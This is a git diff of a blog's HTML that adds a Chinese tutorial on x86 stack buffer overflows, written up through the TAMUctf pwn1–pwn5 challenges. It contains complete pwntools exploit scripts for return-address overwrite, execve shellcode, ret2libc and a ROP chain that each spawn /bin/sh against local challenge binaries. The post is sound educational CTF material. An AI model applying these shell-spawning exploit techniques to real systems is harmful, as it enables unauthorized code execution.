@@ -231,6 +231,316 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yaqing.site/2018/08/03/20180803/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="洋葱">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="洋葱">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/08/03/20180803/" itemprop="url">二进制之栈溢出复习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-03T10:03:15+08:00">
+                Aug 3 2018
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="二进制常见漏洞之栈溢出"><a href="#二进制常见漏洞之栈溢出" class="headerlink" title="二进制常见漏洞之栈溢出"></a>二进制常见漏洞之栈溢出</h1><p>栈的定义（摘自百度百科）<br><img src="https://ws1.sinaimg.cn/large/72105478gy1ftty4zaxwij20ro0703zs.jpg" alt="">     </p>
+<p>别人的理解：当高级语言被编译成计算机可以识别的机器码时，有一个问题就凸现出来：在CPU中，计算机没有办法知道一个函数调用需要多少个、什么样的参数，也没有硬件可以保存这些参数。也就是说，计算机不知道怎么给这个函数传递参数，传递参数的工作必须由函数调用者和函数本身来协调。为此，计算机提供了一种被称为栈的数据结构来支持参数传递。      </p>
+<p>我的理解：栈就是一个临时存储数据的内存空间，它的存在可以使得函数调用的参数和数据能够有地方存放和维护。</p>
+<p><strong>重点</strong>：<code>esp</code>和<code>ebp</code>寄存器，函数调用栈时入栈顺序</p>
+<h2 id="esp和ebp寄存器"><a href="#esp和ebp寄存器" class="headerlink" title="esp和ebp寄存器"></a><code>esp</code>和<code>ebp</code>寄存器</h2><p><code>esp</code>寄存器中始终保存着栈顶的地址，可以理解为<code>esp</code>是一个栈顶指针。<br><code>ebp</code>寄存器可以理解为<code>esp</code>的手，由于<code>esp</code>始终保存着栈顶地址，不能乱动它，所以如果你想取出栈上某一地址的数据，可以通过<code>ebp</code>。     </p>
+<p>我们看程序的汇编语言的时候，在调用函数的时候，最先出来的两句汇编语句是(以x86为例）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div></pre></td><td class="code"><pre><div class="line">push ebp</div><div class="line">mov ebp,esp</div><div class="line">```    </div><div class="line">懂汇编的应该能看懂这两句话吧？看不懂汇编的麻烦请先阅读[《汇编语言》](https://pan.baidu.com/s/1o6ofHz0)，此时`ebp`和`esp`应该指向的都是同一个位置，也就是**此时**的栈顶。     </div><div class="line">    </div><div class="line">## 函数调用栈时入栈顺序     </div><div class="line">先来看一段简单的代码：     </div><div class="line">```cpp=</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int function(int x,int y)</div><div class="line">&#123;</div><div class="line">    int z;</div><div class="line">    z=x*y;</div><div class="line">    return z;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    int a,b,c;</div><div class="line">    a=1;</div><div class="line">    b=2;</div><div class="line">    c=function(a,b);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line">```    </div><div class="line">可以看到在`main`函数里调用了`function`函数：```int function(int x,int y)```。</div><div class="line">关于C语言的函数调用约定，[请看这里](https://www.cnblogs.com/findumars/p/5356217.html)。汇编代码走一波：</div><div class="line">```cpp=</div><div class="line">Dump of assembler code for function main:               </div><div class="line">   0x080483f0 &lt;+0&gt;:     push   ebp                      </div><div class="line">   0x080483f1 &lt;+1&gt;:     mov    ebp,esp                  </div><div class="line">   0x080483f3 &lt;+3&gt;:     sub    esp,0x10                 </div><div class="line">   0x080483f6 &lt;+6&gt;:     mov    DWORD PTR [ebp-0xc],0x1  </div><div class="line">   0x080483fd &lt;+13&gt;:    mov    DWORD PTR [ebp-0x8],0x2  </div><div class="line">   0x08048404 &lt;+20&gt;:    push   DWORD PTR [ebp-0x8]      </div><div class="line">   0x08048407 &lt;+23&gt;:    push   DWORD PTR [ebp-0xc]      </div><div class="line">   0x0804840a &lt;+26&gt;:    call   0x80483db &lt;_Z8functionii&gt;</div><div class="line">   0x0804840f &lt;+31&gt;:    add    esp,0x8                  </div><div class="line">   0x08048412 &lt;+34&gt;:    mov    DWORD PTR [ebp-0x4],eax  </div><div class="line">   0x08048415 &lt;+37&gt;:    mov    eax,0x0                  </div><div class="line">   0x0804841a &lt;+42&gt;:    leave                           </div><div class="line">   0x0804841b &lt;+43&gt;:    ret   </div><div class="line">   </div><div class="line">Dump of assembler code for function _Z8functionii:</div><div class="line">   0x080483db &lt;+0&gt;:     push   ebp</div><div class="line">   0x080483dc &lt;+1&gt;:     mov    ebp,esp</div><div class="line">   0x080483de &lt;+3&gt;:     sub    esp,0x10</div><div class="line">   0x080483e1 &lt;+6&gt;:     mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">   0x080483e4 &lt;+9&gt;:     imul   eax,DWORD PTR [ebp+0xc]</div><div class="line">   0x080483e8 &lt;+13&gt;:    mov    DWORD PTR [ebp-0x4],eax</div><div class="line">   0x080483eb &lt;+16&gt;:    mov    eax,DWORD PTR [ebp-0x4]</div><div class="line">   0x080483ee &lt;+19&gt;:    leave</div><div class="line">   0x080483ef &lt;+20&gt;:    ret</div><div class="line">```    </div><div class="line">这里还要掌握一个点就是，在调用函数的时候，一定要了解汇编指令`call`的调用过程。</div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftu5pcfb28j20bh041q31.jpg)</div><div class="line">`call`指令的第一步操作就是将下一条指令`push`入栈中，也就是说把返回地址放到了栈上，当函数调用要结束的时候，才能通过`ret`指令把返回地址放到`eip`,重新找到程序下一步要执行的指令。</div><div class="line">那么现在就根据这些汇编代码来把参数依次放上栈吧。</div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftu6dml1k9j20wh0gmdgs.jpg)      </div><div class="line">希望亲自通过调试去看到栈上变化，推荐`gdb`的两个插件：[`peda`](https://github.com/longld/peda),[`gef`](https://github.com/hugsy/gef)     </div><div class="line">    </div><div class="line">所以总结一下：     </div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftu6jam9wcj20vg0hy75h.jpg)     </div><div class="line">用这张图就非常形象的来诠释函数调用时`ebp`,传参和局部变量的分布，还有栈的增长方向。      </div><div class="line"></div><div class="line">##  栈溢出</div><div class="line">了解完函数调用栈上面已经讲的差不多了，现在才回到主题来说栈溢出。栈溢出是什么？在栈上写入超过长度限制的数据，从而破坏程序运行甚至获得系统权限的攻击手段。     </div><div class="line">栈溢出的条件有两个：</div><div class="line">1. **程序要有向栈内写入数据的这个操作**</div><div class="line">2. **写入的这个数据长度不被限制**     </div><div class="line"></div><div class="line">如上所说，函数调用结束会通过`ret`这个操作把返回地址送入`eip`，那如果我们把这个返回地址修改了呢？那么`eip`就会执行我们想让它执行的指令，这是攻击者的目的。     </div><div class="line">     </div><div class="line">还有一个要注意的地方就是，在32位系统下的参数都是用栈来传递的，而在64位系统下优先考虑寄存器`rdi`，`rsi`，`rdx`，`rcx`，`r8`，`r9`来传参，剩下还有多余的参数才会考虑用栈传递。</div><div class="line"></div><div class="line">通过几个栗子来看看栈溢出究竟是怎么实现的吧。（用例子说明更有说服力）</div><div class="line">[题目链接放这里](https://github.com/LJRosemary/ctf/tree/master/TAMUctf)     </div><div class="line"></div><div class="line">### 0x0 pwn1</div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftu81kfdtkj20lf09n3ys.jpg)</div><div class="line">逻辑上看我们是不可能跳进`print_flag`函数里面的，但是，我们看一下`stack`就可以发现，`v5`就在`s`上面：    </div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftu9rvaro4j20fw0f0gm2.jpg)    </div><div class="line">又因为`gets`函数不限制输入长度，那么我们就可以覆盖s使之等于`0xF007BA11`。    </div><div class="line">利用脚本如下：    </div><div class="line">```.py</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level=&apos;debug&apos;</div><div class="line">		</div><div class="line">def send_str():</div><div class="line">	pro=process(&quot;./pwn1&quot;)</div><div class="line">	#pro=remote(&apos;127.0.0.1&apos;,7777)</div><div class="line">	pro.recvuntil(&quot;secret?&quot;)</div><div class="line">	payload=&quot;A&quot;*23</div><div class="line">	payload+=p32(0xF007BA11)</div><div class="line">	pro.send(payload)</div><div class="line">	pro.interactive()</div><div class="line"></div><div class="line">send_str()</div><div class="line">```    </div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftuac4n9xyj20n50bo7a8.jpg)</div><div class="line"></div><div class="line">总结：所以这题我们只是让程序跳到想到达的位置，并没有写`shellcode`或者是用更加复杂的利用手段去获得系统权限。</div><div class="line">    </div><div class="line">### 0x1 pwn2    </div><div class="line">这一题的溢出点和上一题也是一样的，但是不一样的地方在于我们如何去利用这个溢出点。    </div><div class="line">    </div><div class="line">前面说了，溢出的条件有两个，往程序里写数据并且这个数据长度没有限制。我们已经找到这样一个漏洞，那么我们要想着如何去利用它，就是需要去想我们怎么通过这个漏洞的返回地址，跳到我们想要程序运行的位置。在正常的CTF线上解题赛中，`pwn`的最终目的是获取`flag`，在这题中我们同样带着这个目的去思考如何利用它。     </div><div class="line">    </div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftua43m8iij20n50dlgm3.jpg)    </div><div class="line">可以看到其实程序本身是存在一个`print_flag`函数的，那么这就是我们的利用点，我们需要使得程序跳到这个函数的入口点，让它执行读`flag`。     </div><div class="line">    </div><div class="line">关于payload的大小，这题我们可以通过`stack`直接计算就可以得到：</div></pre></td></tr></table></figure></p>
+<p>payload = padding <em> 0xEF +padding </em> 4 + p32(0x0804854B)<br>4字节是EBP<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">    </div><div class="line">利用脚本如下：</div><div class="line">```py</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level=&apos;debug&apos;</div><div class="line">		</div><div class="line">def send_str():</div><div class="line">	pro=process(&quot;./pwn2&quot;)</div><div class="line">	#pro=remote(&apos;127.0.0.1&apos;,7777)</div><div class="line">	pro.recvuntil(&quot;me!&quot;)</div><div class="line">	payload=&quot;A&quot;*0xEF+&quot;A&quot;*4</div><div class="line">	payload+=p32(0x0804854B)</div><div class="line">	pro.send(payload)</div><div class="line">	pro.interactive()</div><div class="line"></div><div class="line">send_str()</div><div class="line">```    </div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftuaokwtggj20qb0g9wfx.jpg)    </div><div class="line"></div><div class="line">总结：找到漏洞不是最难的一步，如何利用这个漏洞才是。</div><div class="line"></div><div class="line">### 0x2 pwn3</div><div class="line"></div><div class="line">都是同一个溢出点，但是不同的是，这题并不能通过函数来读取flag。之前有说到`pwn`的最终目的是获取远程服务器上的`flag`文件，然后去读取`flag`文件中的`flag`，既然我们不能通过程序中的函数读取远程服务器上的文件，那么最容易想到的方法是什么？获取远程主机的权限（`getshell`)，这样我们就可以直接`cat flag.txt`。    </div><div class="line">    </div><div class="line">![](https://ws1.sinaimg.cn/large/72105478gy1ftv470qh42j20fg05x0sp.jpg)</div><div class="line"></div><div class="line">可以看到程序其实给我们泄露了`s`的地址，既然它给了我们这个地址，我们就要把它利用起来。我们可以让程序在溢出的时候跳到这个位置，然后在这个位置上写入一段攻击代码(`shellcode`)，从而获取系统权限。还有不需要担心的是，这段`shellcode`你可以不用自己写，网上有非常多`shellcode`可以利用，比如说[exploit-db](https://www.exploit-db.com/ &quot;exploit-db&quot;)。     </div><div class="line">    </div><div class="line">好了，在写EXP的之前再整理一下利用流程。</div><div class="line">1. `gets(&amp;s)`是一个栈溢出点，程序本身又泄露了`&amp;s`</div><div class="line">2. 所以我们可以把shellcode写在`s`的栈上</div><div class="line">3. 将返回地址设置为`&amp;s`使得程序在溢出的时候跳到`s`的起始位置开始执行`shellcode`</div><div class="line"></div><div class="line">so，`payload = shellcode + &quot;a&quot;*(len(shellcode)-1) + &quot;a&quot;*4 + addr of shellcode `</div><div class="line"></div><div class="line">```py</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level=&apos;debug&apos;</div><div class="line">shellcode=&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</div><div class="line"></div><div class="line"></div><div class="line">def getshell():</div><div class="line">	pro=process(&quot;./pwn3&quot;)</div><div class="line">	pro.recvuntil(&quot;number &quot;)</div><div class="line">	addr=pro.recv(numb=10)</div><div class="line">	pro.recvuntil(&quot;echo?&quot;)</div><div class="line">	print &quot;addr:&quot;,addr</div><div class="line">	</div><div class="line">	addr=int(addr,16)</div><div class="line">	payload=shellcode+&quot;a&quot;*(0xee-len(shellcode))+&quot;a&quot;*4+p32(addr)</div><div class="line">	pro.send(payload)</div><div class="line">	pro.interactive()</div><div class="line">	</div><div class="line">getshell()</div></pre></td></tr></table></figure></p>
+<p><img src="https://ws1.sinaimg.cn/large/72105478gy1ftv64a64j8j20w00arjt0.jpg" alt="">    </p>
+<p>总结：这题我们做的就是修改返回地址，让其指向溢出数据中的一段指令（<code>shellcode</code>）   </p>
+<h3 id="0x3-pwn4"><a href="#0x3-pwn4" class="headerlink" title="0x3 pwn4"></a>0x3 pwn4</h3><p><img src="https://ws1.sinaimg.cn/large/72105478gy1ftv6iugp14j20ze0j0my6.jpg" alt="">    </p>
+<p>这个程序主要是通过<code>system</code>系统函数调用了<code>ls</code>，<code>cal</code>，<code>pwd</code>，<code>whoami</code>，<code>exit</code>等命令。那么我们一般<code>getshell</code>是需要什么命令？<code>system(&#39;/bin/sh&#39;)</code>。程序中已经存在了<code>system</code>函数，那如果程序中有<code>/bin/sh</code>字符串，那么就容易多了。庆幸的是，搜一下（<code>Alt+T</code>），就能看到<code>/bin/sh</code>字符串了，接下来就是利用的问题了。    </p>
+<p><img src="https://ws1.sinaimg.cn/large/72105478gy1ftv6qft9e1j20r30am74q.jpg" alt="">     </p>
+<p>假设我们要最终利用<code>system</code>函数调用<code>system(&#39;/bin/sh&#39;)</code>。那么<code>payload = &quot;A&quot;*0x1c + &quot;A&quot;*0x1c + addr of system + addr of ret + addr of /bin/sh</code>，这里通过图来说明一下为什么<code>payload</code>是这样（因为对于初学者来说可能对函数调用栈还没有那么熟悉）    </p>
+<p><img src="https://ws1.sinaimg.cn/large/72105478gy1ftvbc1fr8ij20v60gigmh.jpg" alt=""> </p>
+<p>当<code>system</code>函数的地址被放在返回地址上的时候，为什么<code>ebp+8</code>是<code>AAAA</code>，<code>ebp+0xc</code>是<code>addr of /bin/sh</code>？    </p>
+<p>首先，还记不记得函数在调用的时候，是不是先把参数放上栈上，然后放上返回地址，再放入调用者的<code>ebp</code>，接下来才是放局部参数，所以看图:    </p>
+<p><img src="https://ws1.sinaimg.cn/large/72105478gy1ftvbi08crbj20v30hbabb.jpg" alt="">    </p>
+<p>当<code>addr of system</code>被放到<code>eip</code>的时候，<code>esp+4</code>之后栈顶指针变成上图<code>ebp+8</code>的位置，所以这又是一个新的小栈，这样就很容易懂了，至于为什么<code>ret addr</code>我要把它设置为<code>AAAA</code>，是因为我们根本不care在调用<code>system(&quot;/bin/sh&quot;)</code>之后程序要执行下一条指令是什么。    </p>
+<p>利用脚本如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level=<span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></div><div class="line">	pro=process(<span class="string">'./pwn4'</span>)</div><div class="line">	pro.recvuntil(<span class="string">'Input&gt; '</span>)</div><div class="line">	</div><div class="line">	payload=<span class="string">"A"</span>*<span class="number">0x1c</span> + <span class="string">"A"</span>*<span class="number">4</span> + p32(<span class="number">0x08048430</span>) + <span class="string">"A"</span>*<span class="number">4</span> + p32(<span class="number">0x0804A038</span>)</div><div class="line">	pro.send(payload)</div><div class="line">	pro.interactive()</div><div class="line">	</div><div class="line">getshell()</div></pre></td></tr></table></figure></p>
+<p><img src="https://ws1.sinaimg.cn/large/72105478gy1ftvbqtxga0j20qd0hx77e.jpg" alt="">    </p>
+<p>总结：这题我们做的就是修改返回地址，让其指向内存中已有的某个函数（<code>Return2libc</code>）     </p>
+<h3 id="0x4-pwn5"><a href="#0x4-pwn5" class="headerlink" title="0x4 pwn5"></a>0x4 pwn5</h3><p>最后这一题的这个小程序可能比较复杂，当函数变得很多的时候，我个人看来最有效率的方法不是从主函数中去一个个去审计代码，而是从<code>Exports</code>窗口去看调用函数，重点查找一些会出现常见漏洞的函数，比如说<code>read</code>，<code>printf</code>，<code>gets</code>之类的函数，通过<code>X</code>去回看代码是否有漏洞。      </p>
+<p><img src="https://ws1.sinaimg.cn/large/72105478gy1ftvcanca1pj20hd063weh.jpg" alt=""><br>在这里我们通过查找到<code>gets</code>函数，可以看到这是有漏洞的（尽管出题人可能对这个函数进行了一些修改），只要输入一定长度的字符串就能判断其实这里就是漏洞点。     </p>
+<p>所以接下来的难点就又是，如何利用这个漏洞了。上面几道题目，有用到<code>shellcode</code>的，有用到<code>Return2libc</code>的，但是这题一来没有泄露地址让我们写<code>shellcode</code>，二找不到<code>system</code>函数让我们写入<code>/bin/sh</code>，so，我们需要用其他的利用方法。     </p>
+<p>我们的目的是系统调用，是吧？<code>linux</code>下系统调用的汇编指令是<code>int 0x80</code>，执行这条指令的时候，被调用函数的编号要存入<code>eax</code>，其他参数依次存入<code>ebx</code>，<code>ecx</code>，<code>edx</code>，<code>esi</code>，<code>edi</code>中，那我们要去哪里找指令来拼凑成攻击代码呢？     </p>
+<p>不要忘了本身程序就是由代码构成的，我们可以在程序里去找指令，然后把这些指令拼凑成一段攻击代码。如果你从程序中的不同函数中抽几个指令（<code>gadget</code>），那么要让<code>eip</code>跳转到下一个指令的位置，就需要用<code>ret</code>，so，我们需要找的那些<code>gadget</code>的最后一步，都应该是<code>RET</code>指令。    </p>
+<p>那我们怎么去找这些指令呢？不要慌，是有工具的！最常见的有<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external"><code>ROPgadget</code></a>，<a href=""><code>ropper</code></a>。     </p>
+<p>那我们就用<code>ROPgadget</code>吧<br><img src="https://ws1.sinaimg.cn/mw690/72105478gy1ftvfw44ewyj20je0fradl.jpg" alt="">    </p>
+<p><img src="https://ws1.sinaimg.cn/mw690/72105478gy1ftvfv8or2sj20l10cxtbl.jpg" alt=""></p>
+<p>所以我们现在要做的就是拼凑指令，然后，通过<code>int 0x80</code>去调用系统函数。（不过要注意的是，在拼凑这些片段指令的时候，还是需要你有那么点汇编常识和基础的，所以如果对汇编不了解的话，麻烦请先看<a href="https://pan.baidu.com/s/1o6ofHz0" target="_blank" rel="external">《汇编语言》</a>（再重复的安利一下这本书，真的非常适合初学者学汇编）    </p>
+<p>我们需要用到的系统调用获得<code>shell</code>：</p>
+<pre><code class="py">execve(<span class="string">"/bin/sh"</span>,NULL,NULL)
+
+<span class="comment">#eax=系统编号</span>
+<span class="comment">#ebx=addr of "/bin/sh"</span>
+<span class="comment">#ecx=NULL</span>
+<span class="comment">#edx=NULL</span>
+</code></pre>
+<p>关于系统编号，<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="external">请在这里查找</a>，所以<code>eax=0x0b</code>。至于<code>ecx</code>和<code>edx</code>就等于0咯。至于<code>ebx</code>寄存器，我们并不能在程序内找到<code>/bin/sh</code>字符串，所以我们最好自己写入内存里，程序前面几个<code>choice</code>不就是让我们输入吗，那我们就选一个输入”/bin/sh”吧。</p>
+<p>利用脚本如下： </p>
+<pre><code class="py"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context.log_level=<span class="string">'debug'</span>
+
+int_addr=<span class="number">0x08071005</span>
+rop=p32(<span class="number">0x080e80d5</span>)        <span class="comment">#mov al,0xa,ret</span>
+rop+=p32(<span class="number">0x0807ebcf</span>)    <span class="comment">#inc eax,ret</span>
+rop+=p32(<span class="number">0x08073389</span>)    <span class="comment">#pop ebx;pop edx;ret</span>
+rop+=p32(<span class="number">0x080F1A20</span>)    <span class="comment">#addr of /bin/sh</span>
+rop+=p32(<span class="number">0x0</span>)
+rop+=p32(<span class="number">0x080e4325</span>)    <span class="comment">#pop ecx;ret</span>
+rop+=p32(<span class="number">0x0</span>)
+rop+=p32(<span class="number">0x0805cb48</span>)    <span class="comment">#pop edi;pop esi;ret</span>
+rop+=p32(<span class="number">0x0</span>)
+rop+=p32(<span class="number">0x0</span>)
+rop+=p32(int_addr)
+
+<span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span>
+    payload=<span class="string">"A"</span>*<span class="number">0x20</span>+rop
+
+    pro=process(<span class="string">'./pwn5'</span>)
+    pro.sendline(<span class="string">"/bin/sh"</span>)
+    pro.sendline(<span class="string">"b"</span>)
+    pro.sendline(<span class="string">"c"</span>)
+    pro.sendline(<span class="string">"y"</span>)
+    pro.sendline(<span class="string">"2"</span>)
+    pro.sendline(payload)
+    pro.interactive()
+
+getshell()
+</code></pre>
+<p><img src="https://ws1.sinaimg.cn/large/72105478gy1ftw9s946j3j20qt08kwfk.jpg" alt="">     </p>
+<p>上面的rop链是可以通过<code>ROPgadgets</code>自动生成的，具体命令是<code>ROPgadget --binary ./pwn5 --ropchain</code>，但是使用自动生成链要注意长度问题，有时候生成的链长度太长可能写入的时候会出现问题。（建议最好还是自己写rop）</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yaqing.site/2018/07/24/20180729/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="洋葱">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="洋葱">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/07/24/20180729/" itemprop="url">20180729</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-24T10:15:24+08:00">
+                Jul 24 2018
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yaqing.site/2018/07/19/20180720/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -860,297 +1170,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yaqing.site/2018/07/10/20180710-more/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="洋葱">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="洋葱">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/07/10/20180710-more/" itemprop="url">Angr学习之符号表达式和约束求解</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-10T14:52:03+08:00">
-                Jul 10 2018
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="关于约束求解"><a href="#关于约束求解" class="headerlink" title="关于约束求解"></a>关于约束求解</h1><p><strong>参考文档：<a href="https://docs.angr.io/docs/solver.html" target="_blank" rel="external">https://docs.angr.io/docs/solver.html</a></strong><br>除了可以当作模拟器，Angr还有一个东西叫做符号变量，通过它执行算术运算产生AST（百度了一下AST，是一种抽象语法树的数据结构，稍微的看了一下感觉又是在重新预习编译原理），这个抽象运算树可以成为求解器的约束。    </p>
-<p>当给你一个做了运算操作的输出结果，那么输入是什么？这个问题就可以用Angr来解决。    </p>
